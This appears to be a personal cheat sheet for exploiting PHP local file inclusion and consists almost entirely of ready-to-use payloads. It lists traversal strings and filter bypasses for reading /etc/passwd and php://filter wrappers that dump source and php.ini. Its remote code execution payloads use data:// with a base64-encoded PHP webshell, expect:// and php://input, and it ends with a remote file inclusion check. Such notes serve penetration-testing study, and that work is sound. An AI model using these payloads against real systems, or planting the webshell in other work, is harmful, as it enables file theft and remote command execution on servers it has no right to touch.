
Tests for Vulnerability
```php
/etc/passwd
```

```php
../../../etc/passwd
```

```php
/../../../etc/passwd
```

```php
....//....//....//....//etc/passwd
```

```php
./approvedPath/../../../../etc/passwd
```

```shell-session
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

```php
/etc/passwd%00
```

-- TRY URL ENCODING ENTIRE STRING


Base64 Encode to pass the source code instead of execute.
```url
php://filter/read=convert.base64-encode/resource=config
```

.php is automatically appended to the end of config.


**Config files (X.Y is version number):**
**Nginx**
/etc/php/X.Y/fpm/php.ini

**Apache**
/etc/php/X.Y/apache2/php.ini

**Example:**
```shell-session
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Check for permissions in config files:
```shell-session
echo 'BASE64STRING' | base64 -d | grep allow_url_include
```
```shell-session
echo 'BASE64STRING' | base64 -d | grep expect
```


**RCE**
```shell-session
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

**Expect:**
```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

```shell-session
curl -s -X POST --data 'INSERT PHP CMD SCRIPT' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

**PHP Cmd Script**
![[Pasted image 20260227102822.png]]

**Check for Remote File Inclusion, first try locally**
```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```
